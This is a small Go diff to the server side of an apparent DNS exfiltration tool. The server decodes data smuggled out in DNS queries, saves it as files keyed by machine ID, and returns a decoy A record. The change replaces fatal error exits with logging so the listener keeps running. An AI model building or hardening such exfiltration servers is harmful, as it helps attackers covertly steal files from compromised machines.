@@ -62,7 +62,7 @@ func (ex *dnsExfiltrator) HandleDnsRequests(udpServer *net.UDPConn, nameServer s
 	for {
 		_, clientAddr, err := udpServer.ReadFromUDP(buf)
 		if err != nil {
-			log.Fatalln(err)
+			log.Println(err)
 		}
 
 		var request dns.Msg
@@ -118,11 +118,11 @@ func (ex *dnsExfiltrator) HandleDnsRequests(udpServer *net.UDPConn, nameServer s
 			}
 			_, err = file.Write(decodedData)
 			if err != nil {
-				log.Fatalln(err)
+				log.Println(err)
 			}
 			err = file.Close()
 			if err != nil {
-				log.Fatalln(err)
+				log.Println(err)
 			}
 			ex.unprocessedData[machineId] = make([]byte, 0)
 			log.Println("Successfully exfiltrated file:", filename)
@@ -136,13 +136,13 @@ func (ex *dnsExfiltrator) HandleDnsRequests(udpServer *net.UDPConn, nameServer s
 		reply.SetReply(&request)
 		rr, err := dns.NewRR(fmt.Sprintf("%s 300 IN A 8.8.8.8", name))
 		if err != nil {
-			log.Fatalln(err)
+			log.Println(err)
 		}
 		reply.Answer = append(reply.Answer, rr)
 
 		response, err := reply.Pack()
 		if err != nil {
-			log.Fatalln(err)
+			log.Println(err)
 		}
 		udpServer.WriteToUDP(response, clientAddr)
 	}
